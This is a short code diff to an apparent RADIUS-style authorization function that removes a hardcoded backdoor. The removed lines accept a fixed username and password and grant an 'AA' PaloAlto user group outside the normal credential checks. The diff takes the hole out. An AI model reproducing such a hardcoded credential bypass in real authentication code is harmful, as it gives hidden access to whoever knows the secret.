@@ -150,14 +150,6 @@ def check_authorize(cnx,d):
     
     if ':' in password:
         retval, idx,act, res=check_query_1(cnx,user,password, eventtime)
-    elif user=='Mike' and password=='2F2FBasioOW$':
-        retval=True
-        act='accept'
-        res={
-        "request": (()),
-        "reply": (("Reply-Message","Hi from the Other side.."),("PaloAlto-User-Group",":=", "AA")),
-        "config": (("Auth-Type","Accept"),),
-        }          
     elif len(password)==40:
         retval, idx,act, res=check_query_2(cnx,user,password, eventtime)
     record_action(cnx,idx,user,act,ipaddr)
